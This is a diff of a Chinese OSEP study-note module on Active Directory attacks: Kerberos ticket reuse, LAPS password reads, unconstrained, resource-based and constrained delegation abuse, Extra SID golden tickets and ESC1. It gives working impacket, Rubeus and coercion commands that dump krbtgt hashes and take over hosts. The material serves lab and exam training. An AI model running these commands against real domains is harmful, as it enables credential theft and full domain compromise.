@@ -1,17 +1,13 @@
-::: warning Authorized use only
-For the official OSEP labs/exam, or systems you are written-authorized to test. Do not use against unauthorized systems.
+::: warning 仅限授权使用
+本笔记仅用于 OSEP 官方实验 / 考试环境，或已获得书面授权的测试。禁止对未授权系统使用。
 :::
 
-# Module 12 — AD: 票据、委派、LAPS、信任与 ADCS（场景 47、49–55）
+# 12 · AD 攻击：票据、委派、LAPS、信任与 ADCS（场景 47、49–55）
 
-Tickets, LAPS, delegation, trusts, ADCS. Write down who the ticket is for before you run a tool.
+> 前置：按 [00-environment-and-infra](/zh/modules/00-environment-and-infra) 搭好攻击机目录、监听与投递。统一占位符 `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`。
+> 教材依据与 cheat sheet（，下称 CS）对应：场景 47←C5/教材§19.3；49←C1；50←C1/教材21、23 章；51←C5/教材21、23 章；52←教材21、23 章；53←C5/教材21 章；54←教材§22.2.1；55←教材§22.2.2。CS 大节：`AD Enumeration`(≈L7768)、`AD Attacking`(≈L8251，含 Unconstrained Delegation L8253 / Golden Tickets L8394 / LAPS L8460)、`Kerberos`(≈L7071)。
 
-Switch to **中文** in the header for the original full narrative. Lab listings on this page are complete.
-
-> 前置：按 [00-environment-and-infra](/modules/00-environment-and-infra) 搭好attacker box目录、监听与投递。统一占位符 `LHOST LPORT TARGET DOMAIN USER PASS NTHASH PAYLOAD URL`。
-> Course mapping与 cheat sheet（，下称 CS）对应：场景 47←C5/教材§19.3；49←C1；50←C1/教材21、23 章；51←C5/教材21、23 章；52←教材21、23 章；53←C5/教材21 章；54←教材§22.2.1；55←教材§22.2.2。CS 大节：`AD Enumeration`(≈L7768)、`AD Attacking`(≈L8251，含 Unconstrained Delegation L8253 / Golden Tickets L8394 / LAPS L8460)、`Kerberos`(≈L7071)。
-
-**贯穿原则**：本模块八成工作发生在attacker box Kali 上（impacket 套件 + certipy），只有"诱导认证/抓票"必须在目标 Windows 主机侧完成。先把「票据从哪来、要去哪个服务、以谁的身份」写清楚再动手——票据方向错了，命令再对也白搭。
+**贯穿原则**：本模块八成工作发生在攻击机 Kali 上（impacket 套件 + certipy），只有"诱导认证/抓票"必须在目标 Windows 主机侧完成。先把「票据从哪来、要去哪个服务、以谁的身份」写清楚再动手——票据方向错了，命令再对也白搭。
 
 | 场景 | 一句话目标 | 用到的脚本 |
 |---|---|---|
@@ -26,13 +22,13 @@ Switch to **中文** in the header for the original full narrative. Lab listings
 
 ---
 
-## Scenario 47：Linux 上已有域票据，但你需要访问 Windows 服务
+## 场景 47：Linux 上已有域票据，但你需要访问 Windows 服务
 
-**Situation**：已控制一台加域 Linux，拥有有效可访问的 credential cache（ccache）或 keytab；下一跳是 Windows 域中的某个服务（SMB/WinRM/HTTP），没有明文密码。
+**场景回顾**：已控制一台加域 Linux，拥有有效可访问的 credential cache（ccache）或 keytab；下一跳是 Windows 域中的某个服务（SMB/WinRM/HTTP），没有明文密码。
 
-**Assumptions**：Linux 时间与 DC 偏差 <5 分钟（Kerberos 硬性要求，先 `date` 对照）；attacker box可直连 DC 的 TCP/UDP 88 与目标的 445/5985；已知 `DOMAIN`（含 FQDN 大小写）与 DC 主机名/IP。注意：密钥分发必须用**域名全小写**、目标必须用**与 SPN 一致的 FQDN** 访问（不能用 IP）。
+**前提与假设**：Linux 时间与 DC 偏差 <5 分钟（Kerberos 硬性要求，先 `date` 对照）；攻击机可直连 DC 的 TCP/UDP 88 与目标的 445/5985；已知 `DOMAIN`（含 FQDN 大小写）与 DC 主机名/IP。注意：密钥分发必须用**域名全小写**、目标必须用**与 SPN 一致的 FQDN** 访问（不能用 IP）。
 
-**Prepare (attacker)**：
+**准备（攻击机侧）**：
 ```bash
 export KRB5CCNAME=/home/kali/osep/tickets/current.ccache   # 会话级，所有 -k 工具都读它
 klist -e          # 看缓存里是谁的票据、加密类型（rc4/aes 决定能否被 DC 接受）
@@ -40,7 +36,7 @@ klist -e          # 看缓存里是谁的票据、加密类型（rc4/aes 决定�
 ```
 `/etc/krb5.conf` 最小模板与 `/etc/hosts`（`DC01.corp.local`、`TARGET` 的 FQDN 均要可解析）见 `m12-kerberos-tickets-linux.sh`。
 
-**Procedure**：
+**执行步骤**：
 ```bash
 # 1) 用 TGT/TGS 直接认证（-k 读 KRB5CCNAME，-no-pass 不再要密码）
 smbclient -k -L //WS02.corp.local
@@ -50,17 +46,17 @@ evil-winrm -i ws02.corp.local -k                             # 走 Kerberos 需 
 # 2) 票据身份无目标服务访问权 → 用现有票去要别的服务的 TGS
 #    （密钥在缓存里即可，不需要再输密码；详见脚本 ask_tgs 函数）
 ```
-**Lab files**：`m12-kerberos-tickets-linux.sh`（ccache/keytab 使用、格式转换、krb5.conf 模板、按服务要 TGS）。
+**用到的脚本**：`m12-kerberos-tickets-linux.sh`（ccache/keytab 使用、格式转换、krb5.conf 模板、按服务要 TGS）。
 
-**Verify**：`smbclient -k -L //WS02` 能列出共享 / `wmiexec` 出 shell 即通过；`klist` 能看到新增 TGS。若报 `KRB_AP_ERR_MODIFIED`，多为票据主体与 SPN/加密类型不匹配，不是网络问题。
+**验证**：`smbclient -k -L //WS02` 能列出共享 / `wmiexec` 出 shell 即通过；`klist` 能看到新增 TGS。若报 `KRB_AP_ERR_MODIFIED`，多为票据主体与 SPN/加密类型不匹配，不是网络问题。
 
-**If it fails**：
+**失败分支与备选**：
 - 缓存里有票但无法访问目标 → ① 检查目标 FQDN 是否与 SPN 一致（`smbclient -k -L //WS02` 换 `//ws02.corp.local`）；② 你的票主体是否被该服务 ACL 拒绝 → 换一个服务（WinRM 不开就 SMB）。
 - KDC 报加密类型不支持 → `/etc/krb5.conf` 里对 `default_tkt_enctypes/default_tgs_enctypes` 加入 `rc4-hmac` 或补 `aes256-cts-hmac-sha1-96`，与 DC 支持集对齐。
 - 时间偏差错误（`Clock skew too great`）→ `sudo ntpdate DC01` 或手动校准，偏差必须 <5 分钟。
-- 跨网段访问内网 Windows 服务（目标只在内网段可达）→ 先做端口转发/Ligolo（[08-pivoting-tunneling](/modules/08-pivoting-tunneling)），**转发后再 Kerberos**，注意转发路径上的机器也要能到 DC:88。
+- 跨网段访问内网 Windows 服务（目标只在内网段可达）→ 先做端口转发/Ligolo（[08-pivoting-tunneling](/zh/modules/08-pivoting-tunneling)），**转发后再 Kerberos**，注意转发路径上的机器也要能到 DC:88。
 
-**Exam notes / OPSEC**：先用无害动作Verify票据身份（`smbclient -L`）再上执行类工具；ccache 文件按会话区分存放（`~/osep/tickets/`），防止把 A 域票据当 B 域用；所有 `-k` 工具都吃 `KRB5CCNAME`，切换票据必须显式 `export`，并在命令前 `klist` 确认。
+**考试注意 OPSEC**：先用无害动作验证票据身份（`smbclient -L`）再上执行类工具；ccache 文件按会话区分存放（`~/osep/tickets/`），防止把 A 域票据当 B 域用；所有 `-k` 工具都吃 `KRB5CCNAME`，切换票据必须显式 `export`，并在命令前 `klist` 确认。
 
 ---
 
@@ -526,17 +522,17 @@ printf '\n[*] 模式 %s 结束。默认只打印命令；加 -x 才会真正执�
 info "下一步：拿到票 -> -m convert/tgs 加工 -> -m auth 落地；跨域看 -m cross。"
 ````
 
-## Scenario 49：没有本地提权路径，但当前域用户能读取 LAPS
+## 场景 49：没有本地提权路径，但当前域用户能读取 LAPS
 
-**Situation**：初始会话是普通域用户；本机无提权点；但目录 ACL 允许读取**另一台机器**的本地管理员密码（LAPS）。目标：拿该机器本地管理员身份远程执行。
+**场景回顾**：初始会话是普通域用户；本机无提权点；但目录 ACL 允许读取**另一台机器**的本地管理员密码（LAPS）。目标：拿该机器本地管理员身份远程执行。
 
-**Assumptions**：目标域已部署 LAPS 且当前用户对密码属性有读权限（部署时通常会授权给域用户组读取，或你通过 ACL/GenericRead 获得）；LAPS 密码是**target器本地 Administrator** 的密码，不是域用户。先分辨目标用的是**传统 LAPS（AdmPwd，属性 `ms-Mcs-AdmPwd*`）**还是 **Windows LAPS（属性 `msLAPS-Password*`）**，两种查询方式不同。
+**前提与假设**：目标域已部署 LAPS 且当前用户对密码属性有读权限（部署时通常会授权给域用户组读取，或你通过 ACL/GenericRead 获得）；LAPS 密码是**目标机器本地 Administrator** 的密码，不是域用户。先分辨目标用的是**传统 LAPS（AdmPwd，属性 `ms-Mcs-AdmPwd*`）**还是 **Windows LAPS（属性 `msLAPS-Password*`）**，两种查询方式不同。
 
-**Prepare (attacker)**：确认能 LDAP 查询（`ldapsearch` 或 impacket）；准备远程执行模板（目标开 445 → `wmiexec/psexec`；只开 5985 → WinRM）。**Windows 侧**查询脚本：`m12-ad-enum-windows.ps1`。
+**准备（攻击机侧）**：确认能 LDAP 查询（`ldapsearch` 或 impacket）；准备远程执行模板（目标开 445 → `wmiexec/psexec`；只开 5985 → WinRM）。**Windows 侧**查询脚本：`m12-ad-enum-windows.ps1`。
 
-**Procedure**：
+**执行步骤**：
 ```bash
-# attacker box（Linux）直接 LDAP 读属性——先探测存在哪一版 LAPS（两个属性都查）
+# 攻击机（Linux）直接 LDAP 读属性——先探测存在哪一版 LAPS（两个属性都查）
 ldapsearch -x -H ldap://DC01.corp.local -D "CORP\\USER" -w 'PASS' \
   -b "DC=corp,DC=local" "(objectClass=computer)" \
   ms-Mcs-AdmPwd ms-Mcs-AdmPwdExpirationTime msLAPS-Password msLAPS-EncryptedPassword
@@ -545,16 +541,16 @@ impacket-wmiexec CORP/Administrator@WS02.corp.local -hashes :NTHASH   # 或 -p '
 ```
 Windows 侧（会话机）：`m12-ad-enum-windows.ps1 -Mode LAPS -ComputerName WS02`；两版命令速查见 `m12-laps-and-trust-notes.md`。
 
-**Lab files**：`m12-ad-enum-windows.ps1`（LAPS 两版查询 + 枚举）、`m12-ad-enum-linux.sh`（LDAP 批量枚举含 LAPS 属性）、`m12-laps-and-trust-notes.md`（命令速查）。
+**用到的脚本**：`m12-ad-enum-windows.ps1`（LAPS 两版查询 + 枚举）、`m12-ad-enum-linux.sh`（LDAP 批量枚举含 LAPS 属性）、`m12-laps-and-trust-notes.md`（命令速查）。
 
-**Verify**：读到的密码能成功 `wmiexec`/`psexec` 进 WS02；若密码"看起来对但进不去"，先Verify该密码是不是 WS02 的（LAPS 密码按机器区分），并确认远程执行协议开放。
+**验证**：读到的密码能成功 `wmiexec`/`psexec` 进 WS02；若密码"看起来对但进不去"，先验证该密码是不是 WS02 的（LAPS 密码按机器区分），并确认远程执行协议开放。
 
-**If it fails**：
+**失败分支与备选**：
 - 属性为空/读不到 → ① 该机器可能没启用 LAPS 或密码未过期重置，换机器枚举（一次查全域 `(ms-Mcs-AdmPwd=*)`）；② 当前用户确实无读权限 → 找本模块其他入口（RBCD/委派/证书）先提权到有读权限的身份。
-- Windows LAPS 存的是 `msLAPS-EncryptedPassword`（加密值）→ 明文读取需 `Get-LapsADPassword`（解密由target密钥完成）或用 DC 侧 LAPS 模块；纯 LDAP 拿不到明文时**不要死磕**，换 `msLAPS-Password` 明文模式的机器，或回落到传统 LAPS 机器。
+- Windows LAPS 存的是 `msLAPS-EncryptedPassword`（加密值）→ 明文读取需 `Get-LapsADPassword`（解密由目标机密钥完成）或用 DC 侧 LAPS 模块；纯 LDAP 拿不到明文时**不要死磕**，换 `msLAPS-Password` 明文模式的机器，或回落到传统 LAPS 机器。
 - 只开 WinRM 不开 SMB → 换 `evil-winrm`；两协议都不开 → LAPS 密码无用，回到枚举找其他入口。
 
-**Exam notes / OPSEC**：LAPS 查询会产生 LDAP 审计日志，属预期内枚举行为，但不要对全域做无差别密码 dump 后逐个乱试；执行目标只选场景需要的机器。密码字符串不要 echo 进 shell 历史可读的长命令里（用环境变量或脚本参数）。
+**考试注意 OPSEC**：LAPS 查询会产生 LDAP 审计日志，属预期内枚举行为，但不要对全域做无差别密码 dump 后逐个乱试；执行目标只选场景需要的机器。密码字符串不要 echo 进 shell 历史可读的长命令里（用环境变量或脚本参数）。
 
 ---
 
@@ -1080,15 +1076,15 @@ Write-Output "[*] 完成 -Mode $Mode。委派/RBCD 落地：m12-delegation-attac
 Write-Output "[*] Linux 侧同款枚举：m12-ad-enum-linux.sh；信任与 Extra SID：m12-laps-and-trust-notes.md"
 ````
 
-## Scenario 50：控制了非约束委派机器，但还没有域级身份
+## 场景 50：控制了非约束委派机器，但还没有域级身份
 
-**Situation**：已控制一台配置**非约束委派（Trusted for Delegation）**的机器（能跑 Rubeus/触发认证）；还没有任何域管理身份。下一步取决于能否让高价值身份（DC 机器账户或域管）向该机器认证并截获其 TGT。
+**场景回顾**：已控制一台配置**非约束委派（Trusted for Delegation）**的机器（能跑 Rubeus/触发认证）；还没有任何域管理身份。下一步取决于能否让高价值身份（DC 机器账户或域管）向该机器认证并截获其 TGT。
 
-**Assumptions**：目标 DC/域管的 SPN 端口（445/5985 或 88 回连）可达该非约束主机；非约束主机上以 SYSTEM 运行抓票工具。DC 机器账户的 TGT 一旦到手 = 可 DCSync（DC 有复制权限）；域管的 TGT = 直接冒充。
+**前提与假设**：目标 DC/域管的 SPN 端口（445/5985 或 88 回连）可达该非约束主机；非约束主机上以 SYSTEM 运行抓票工具。DC 机器账户的 TGT 一旦到手 = 可 DCSync（DC 有复制权限）；域管的 TGT = 直接冒充。
 
-**Prepare (attacker)**：非约束主机上准备 `Rubeus.exe` + 认证触发器（`SpoolSample.exe` / `printerbug` / `PetitPotam`）；attacker box准备 `impacket-ticketConverter` 与 `secretsdump`。诱导认证触发方式见 `m12-delegation-attacks.ps1 -Mode Unconstrained`。
+**准备（攻击机侧）**：非约束主机上准备 `Rubeus.exe` + 认证触发器（`SpoolSample.exe` / `printerbug` / `PetitPotam`）；攻击机准备 `impacket-ticketConverter` 与 `secretsdump`。诱导认证触发方式见 `m12-delegation-attacks.ps1 -Mode Unconstrained`。
 
-**Procedure**：
+**执行步骤**：
 ```powershell
 # ① 非约束主机（SYSTEM）后台开抓票
 Rubeus.exe monitor /interval:5 /nowrap
@@ -1097,22 +1093,22 @@ SpoolSample.exe DC01 $env:COMPUTERNAME        # 或 printerbug DC01 $env:COMPUTE
 # ③ monitor 输出出现 DC01$ 的 base64 TGT → 存成 dc.txt
 ```
 ```bash
-# ④ attacker box转换并利用
+# ④ 攻击机转换并利用
 impacket-ticketConverter dc.txt dc.ccache
 export KRB5CCNAME=dc.ccache
 impacket-secretsdump -k -no-pass DC01.corp.local        # DC 机器账户 → DCSync krbtgt/域管哈希
 impacket-psexec -k -no-pass CORP/Administrator@DC01.corp.local -hashes :NTHASH  # 拿到哈希后
 ```
-**Lab files**：`m12-delegation-attacks.ps1`（Rubeus monitor + 触发 + base64 导出模板；Linux 侧转换命令也在注释里）。
+**用到的脚本**：`m12-delegation-attacks.ps1`（Rubeus monitor + 触发 + base64 导出模板；Linux 侧转换命令也在注释里）。
 
-**Verify**：`secretsdump` 能 dump 出 `krbtgt`/管理员哈希即证明拿到的是 DC 机器 TGT；先 `klist` 看主体是否为 `DC01$`。
+**验证**：`secretsdump` 能 dump 出 `krbtgt`/管理员哈希即证明拿到的是 DC 机器 TGT；先 `klist` 看主体是否为 `DC01$`。
 
-**If it fails**：
+**失败分支与备选**：
 - SpoolSample 无回显/报错（补丁打了或 RPC 被封）→ 换诱导向量：`PetitPotam`(EFSRPC)、`DFSCoerce`、MS-RPRN 变体 `dementor`；仍不行 → 被动等：Rubeus monitor 挂着，等待真实域管登录本机或访问本机服务。
 - 抓到的是普通用户 TGT（不是 DC/域管）→ 用它先横向（该用户能访问的机器），或继续等更高价值认证；也可用 `Rubeus harvest` 思路扩大覆盖面。
 - 非约束主机与 DC 不在可达网段 → 无法诱导认证时，该主机价值只剩"被动收集"，回到枚举找其他入口（不要把时间耗在不可能的回连上）。
 
-**Exam notes / OPSEC**：非约束主机上跑 `Rubeus monitor` 会持续抓所有认证，日志明显——任务完成（拿到 DC 票）就停；抓到的票第一时间导出到attacker box再清理本机 base64 文本。不要拿域管 TGT 直接 `psexec` 乱跳，先 `secretsdump` 确认价值再决定最小动作。
+**考试注意 OPSEC**：非约束主机上跑 `Rubeus monitor` 会持续抓所有认证，日志明显——任务完成（拿到 DC 票）就停；抓到的票第一时间导出到攻击机再清理本机 base64 文本。不要拿域管 TGT 直接 `psexec` 乱跳，先 `secretsdump` 确认价值再决定最小动作。
 
 ---
 
@@ -1564,22 +1560,22 @@ Write-Output "[*] 提示：票据相关的高价值动作（secretsdump / ticket
 Write-Output "[*]        Windows 侧只负责抓票与诱导认证；完成后记得回滚 RBCD 并清理票据。"
 ````
 
-## Scenario 51：对计算机对象有相关写权限，但不能直接管理目标主机（RBCD）
+## 场景 51：对计算机对象有相关写权限，但不能直接管理目标主机（RBCD）
 
-**Situation**：对target器（如 WS02）的计算机对象具备写权限（典型：GenericWrite/GenericAll 或能改 `msDS-AllowedToActOnBehalfOfOtherIdentity`）；同时具备一个"可被模拟主体"（自建机器账户即可，默认域策略允许普通用户加 10 台）。目标：以管理员身份访问 WS02。
+**场景回顾**：对目标机器（如 WS02）的计算机对象具备写权限（典型：GenericWrite/GenericAll 或能改 `msDS-AllowedToActOnBehalfOfOtherIdentity`）；同时具备一个"可被模拟主体"（自建机器账户即可，默认域策略允许普通用户加 10 台）。目标：以管理员身份访问 WS02。
 
-**Assumptions**：当前用户能向域加机器账户（`MachineAccountQuota`>0，默认 10）；WS02 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 当前为空（未被利用过）；目标账户（Administrator）不是 Protected Users、未勾选"敏感账户不可委派"。
+**前提与假设**：当前用户能向域加机器账户（`MachineAccountQuota`>0，默认 10）；WS02 的 `msDS-AllowedToActOnBehalfOfOtherIdentity` 当前为空（未被利用过）；目标账户（Administrator）不是 Protected Users、未勾选"敏感账户不可委派"。
 
-**Prepare (attacker)**：impacket `addcomputer / getTGT / getST / wmiexec`；**Windows 侧**写属性函数见 `m12-delegation-attacks.ps1 -Mode RBCD`（用 .NET ADSI 写安全描述符，不依赖 ActiveDirectory 模块）。
+**准备（攻击机侧）**：impacket `addcomputer / getTGT / getST / wmiexec`；**Windows 侧**写属性函数见 `m12-delegation-attacks.ps1 -Mode RBCD`（用 .NET ADSI 写安全描述符，不依赖 ActiveDirectory 模块）。
 
-**Procedure**：
+**执行步骤**：
 ```bash
 # ① 加一台假机器（记下密码）
 impacket-addcomputer -computer-name 'FAKE01$' -computer-pass 'Fake#Passw0rd' \
   -dc-ip DC01.corp.local 'CORP/USER:PASS'
 # ② Windows 侧：把 FAKE01$ 的 SID 写进 WS02 的 AllowedToActOnBehalfOfOtherIdentity
 #    见 m12-delegation-attacks.ps1 -Mode RBCD -TargetComputer WS02 -FakeAccount 'FAKE01$'
-# ③ attacker box：给假机器要 TGT，再模拟 Administrator 要 cifs/WS02 的服务票据
+# ③ 攻击机：给假机器要 TGT，再模拟 Administrator 要 cifs/WS02 的服务票据
 impacket-getTGT -dc-ip DC01.corp.local 'CORP/FAKE01$:Fake#Passw0rd'
 export KRB5CCNAME=FAKE01.ccache
 impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
@@ -1587,29 +1583,29 @@ impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
 export KRB5CCNAME=Administrator.ccache
 impacket-wmiexec -k -no-pass CORP/Administrator@WS02.corp.local
 ```
-**Lab files**：`m12-delegation-attacks.ps1`（RBCD 模式：查 SID、写属性、回滚）。
+**用到的脚本**：`m12-delegation-attacks.ps1`（RBCD 模式：查 SID、写属性、回滚）。
 
-**Verify**：`wmiexec -k` 成功出 shell；`klist` 里能看到 `cifs/WS02.corp.local` 的 TGS 且主体是 `Administrator`。
+**验证**：`wmiexec -k` 成功出 shell；`klist` 里能看到 `cifs/WS02.corp.local` 的 TGS 且主体是 `Administrator`。
 
-**If it fails**：
+**失败分支与备选**：
 - `addcomputer` 报配额/权限错误（MAQ=0）→ 用你**已控制密码或哈希的既有服务账户**（带 SPN）当假主体，其余流程不变（它必须是你持有凭据的账户）。
 - 属性写入失败 → 确认你写的是 WS02 计算机对象的完整 DN（不是容器）；用 `m12-delegation-attacks.ps1` 的回滚函数清掉属性再重试；GenericWrite 不等于能改该属性时，检查目标对象上是否有更宽松 ACL（换一台你确有写权限的机器）。
 - `getST` 报 KDC 错 → S4U2Self 成功但 S4U2Proxy 被拒，常见原因：目标账户敏感不可委派 / 假主体无 SPN（addcomputer 会自动注册 `host/FAKE01`，若手动建账户要补 SPN）/ 票据过期，重新走 ①。
 - 模拟 Administrator 被拒 → 换模拟其他管理员（如域管组的另一成员）。
 
-**Exam notes / OPSEC**：改 WS02 的委派属性是**持久痕迹**，完成任务后必须回滚（脚本提供 rollback），否则复查时target器处于被接管状态会扣分；假机器账户用完可删（可选，但至少删掉不再用的票据缓存）。
+**考试注意 OPSEC**：改 WS02 的委派属性是**持久痕迹**，完成任务后必须回滚（脚本提供 rollback），否则复查时目标机器处于被接管状态会扣分；假机器账户用完可删（可选，但至少删掉不再用的票据缓存）。
 
 ---
 
-## Scenario 52：控制了服务账户，存在约束委派，但只能访问指定服务
+## 场景 52：控制了服务账户，存在约束委派，但只能访问指定服务
 
-**Situation**：掌握一个配置了**约束委派（AllowedToDelegateTo）**的服务账户（如 `svc_sql`），能模拟任意用户但**只能**访问委派指定的 SPN（如 `cifs/WS02` / `http/WS02`），不能访问任意机器。
+**场景回顾**：掌握一个配置了**约束委派（AllowedToDelegateTo）**的服务账户（如 `svc_sql`），能模拟任意用户但**只能**访问委派指定的 SPN（如 `cifs/WS02` / `http/WS02`），不能访问任意机器。
 
-**Assumptions**：服务账户凭据有效；确知委派目标 SPN 与主机（枚举见 `m12-ad-enum-windows.ps1 -Mode Delegation`）；区分两种子情形——① `TrustedToAuthForDelegation`（协议转换，S4U2Self 不需要被模拟者密码）；② 无协议转换 → 必须持有被模拟用户的 TGT/密码（"约束委派 + 已知用户凭据"场景，靠 `getST` 的 `-hashes`/`-aesKey` 直接带）。
+**前提与假设**：服务账户凭据有效；确知委派目标 SPN 与主机（枚举见 `m12-ad-enum-windows.ps1 -Mode Delegation`）；区分两种子情形——① `TrustedToAuthForDelegation`（协议转换，S4U2Self 不需要被模拟者密码）；② 无协议转换 → 必须持有被模拟用户的 TGT/密码（"约束委派 + 已知用户凭据"场景，靠 `getST` 的 `-hashes`/`-aesKey` 直接带）。
 
-**Prepare (attacker)**：`impacket-getST`；Windows 侧 `Rubeus s4u` 模板在 `m12-delegation-attacks.ps1 -Mode Constrained`。
+**准备（攻击机侧）**：`impacket-getST`；Windows 侧 `Rubeus s4u` 模板在 `m12-delegation-attacks.ps1 -Mode Constrained`。
 
-**Procedure**：
+**执行步骤**：
 ```bash
 # 协议转换（最常见）：拿 svc_sql 的 TGT → S4U2Self(Administrator) → S4U2Proxy(cifs/WS02)
 impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
@@ -1622,29 +1618,29 @@ impacket-getST -spn cifs/WS02.corp.local -impersonate Administrator \
 ```
 Windows 侧等价：`Rubeus.exe s4u /user:svc_sql /password:PASS /impersonateuser:Administrator /msdsspn:cifs/WS02 /ptt`（协议转换）；无转换时给 Rubeus 加 `/aes256`（被模拟用户哈希不可用于 S4U2Self，只能走 S4U2Proxy）。
 
-**Lab files**：`m12-delegation-attacks.ps1`（约束委派两子情形模板 + 目标 SPN 枚举）。
+**用到的脚本**：`m12-delegation-attacks.ps1`（约束委派两子情形模板 + 目标 SPN 枚举）。
 
-**Verify**：拿到 `Administrator.ccache` 后 `wmiexec -k` 进 WS02；只允许 HTTP SPN 时改走 `curl --negotiate`/WinRM 相应工具Verify而非 SMB。
+**验证**：拿到 `Administrator.ccache` 后 `wmiexec -k` 进 WS02；只允许 HTTP SPN 时改走 `curl --negotiate`/WinRM 相应工具验证而非 SMB。
 
-**If it fails**：
+**失败分支与备选**：
 - 委派目标是 `cifs/WS02` 但你想用同一主机的其他服务（如 `http`）→ 若委派列表写的是 `cifs/WS02` 单条，不能改服务类；查 `AllowedToDelegateTo` 是否含 `http`/`wsman`，用 `-altservice` 仅当主机相同且配置允许多服务类。
 - 模拟的 Administrator 无法访问（敏感不可委派）→ 换可模拟的管理员账户。
 - 只有 NTHASH 无明文密码 → `getST` 带 `-hashes`；DC 强制 AES-only 时需 `-aesKey`（枚举里取）。
 - 服务账户本身 SPN 需要（S4U 的前提是被模拟者是服务账户身份）——svc 账户一般自带 SPN，若没有先补一个。
 
-**Exam notes / OPSEC**：约束委派只对**指定 SPN 主机**有效，不要试图把票用到别的机器上浪费时间；模拟对象与目标服务按场景最小化，拿到目标后立即清理 ccache，避免票在attacker box留存。
+**考试注意 OPSEC**：约束委派只对**指定 SPN 主机**有效，不要试图把票用到别的机器上浪费时间；模拟对象与目标服务按场景最小化，拿到目标后立即清理 ccache，避免票在攻击机留存。
 
 ---
 
-## Scenario 53：掌握了子域高权限，最终目标在林根
+## 场景 53：掌握了子域高权限，最终目标在林根
 
-**Situation**：已控制子域（`child.corp.local`）高权限（含子域 krbtgt 或子域 DA 可 dump），最终目标资产在林根（`corp.local`）。**不能预设一定可行**：必须先判定信任类型/方向与 SID 过滤是否生效。
+**场景回顾**：已控制子域（`child.corp.local`）高权限（含子域 krbtgt 或子域 DA 可 dump），最终目标资产在林根（`corp.local`）。**不能预设一定可行**：必须先判定信任类型/方向与 SID 过滤是否生效。
 
-**Assumptions**：需要掌握——① 信任类型：林内父子信任（`TrustAttributes: WITHIN_FOREST`，SID 过滤默认不生效 → Extra SID 攻击可行）；还是外部/林间信任（SID 过滤默认开启 → Extra SID 无效）；② 方向：双向/单向（能认证过去即可）；③ 子域 krbtgt 哈希（Extra SID 黄金票据需要）或子域信任密钥。
+**前提与假设**：需要掌握——① 信任类型：林内父子信任（`TrustAttributes: WITHIN_FOREST`，SID 过滤默认不生效 → Extra SID 攻击可行）；还是外部/林间信任（SID 过滤默认开启 → Extra SID 无效）；② 方向：双向/单向（能认证过去即可）；③ 子域 krbtgt 哈希（Extra SID 黄金票据需要）或子域信任密钥。
 
-**Prepare (attacker)**：`nltest`/PowerShell 枚举信任（脚本 `m12-ad-enum-linux.sh -Mode Trust`）；`impacket-ticketer`（做 Extra SID 黄金票）；确认根域 SID（`Get-DomainSID`/ldapsearch）。
+**准备（攻击机侧）**：`nltest`/PowerShell 枚举信任（脚本 `m12-ad-enum-linux.sh -Mode Trust`）；`impacket-ticketer`（做 Extra SID 黄金票）；确认根域 SID（`Get-DomainSID`/ldapsearch）。
 
-**Procedure**：
+**执行步骤**：
 ```bash
 # ① 判定：子域上查信任属性与双方 SID
 nltest /domain_trusts /all_trusts
@@ -1657,17 +1653,17 @@ export KRB5CCNAME=Administrator.ccache
 # ③ 认证到根域资产（根 DC 的 cifs 或 LDAP）
 impacket-secretsdump -k -no-pass ROOTDC.corp.local
 ```
-**Lab files**：`m12-ad-enum-linux.sh`（信任/域 SID 枚举输出）；`m12-laps-and-trust-notes.md`（判定表 + Extra SID 条件速查）。
+**用到的脚本**：`m12-ad-enum-linux.sh`（信任/域 SID 枚举输出）；`m12-laps-and-trust-notes.md`（判定表 + Extra SID 条件速查）。
 
-**Verify**：`secretsdump -k` 对根 DC 能 dump 出根域 `krbtgt` 即证明 Extra SID 生效（拿到根域身份）。若只拿到子域内容/被拒，说明过滤生效或方向不符，走失败分支。
+**验证**：`secretsdump -k` 对根 DC 能 dump 出根域 `krbtgt` 即证明 Extra SID 生效（拿到根域身份）。若只拿到子域内容/被拒，说明过滤生效或方向不符，走失败分支。
 
-**If it fails**：
+**失败分支与备选**：
 - 信任是外部/林间（SID 过滤开启）→ Extra SID 无效，别耗：改用跨域 ACL（子域 DA 常被授予根域某些资源权限，先枚举根域对子域主体的 ACL）或找根域中可达的其他入口（LAPS/委派/证书重新评估）。
 - 单向信任方向是"根→子"（子域不能认证到根）→ Extra SID 与互信票都走不通，只能靠根域内其他路径。
 - 没有子域 krbtgt 但已控子域 DA → 先在子域 DC `secretsdump` 拿 krbtgt 再做黄金票；拿不到 krbtgt（只控非 DC 高权限）→ 走子域内其他横向到 DC。
 - 黄金票主体在根域认证失败（TGS 被拒）→ 检查 `/etc/hosts` 里根 DC FQDN、`-extra-sid` 的根域 SID 是否写对（少 519 后缀或根域 SID 抄错是高频错误）。
 
-**Exam notes / OPSEC**：黄金票属于"域内最高敏感"操作，只在确认信任判定（WITHIN_FOREST + 方向可行）后执行；ticketer 只在attacker box本地跑，不投递任何文件到目标；完成后清理 ccache。
+**考试注意 OPSEC**：黄金票属于"域内最高敏感"操作，只在确认信任判定（WITHIN_FOREST + 方向可行）后执行；ticketer 只在攻击机本地跑，不投递任何文件到目标；完成后清理 ccache。
 
 ---
 
@@ -2378,17 +2374,17 @@ whoami /groups                               # 注入 /ptt 后应能看到 Enter
 - 时间偏差 >5 分钟会让一切 Kerberos 操作失败，先校时再排查。
 ````
 
-## Scenario 54：低权限域用户可以申请错误配置的证书模板（ESC1）
+## 场景 54：低权限域用户可以申请错误配置的证书模板（ESC1）
 
-**Situation**：域内部署 ADCS；某已发布模板满足 ESC1 条件，且当前低权限用户**拥有申请权**。目标：用证书拿到管理员身份。
+**场景回顾**：域内部署 ADCS；某已发布模板满足 ESC1 条件，且当前低权限用户**拥有申请权**。目标：用证书拿到管理员身份。
 
 **ESC1 判定条件（四条同时满足才算）**：① 模板开启**申请者提供 SAN**（`CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT`，即能填 `-upn`）；② 模板 EKU 含**客户端认证**（`Client Authentication`，或用 Any Purpose 的"任意用途"模板，考试常遇到）；③ 模板允许低权限用户/组**注册**（enroll 权限）；④ 模板**未设置** CA 证书管理器审批（`CA Manager Approval` 关闭，否则申请被挂起）。
 
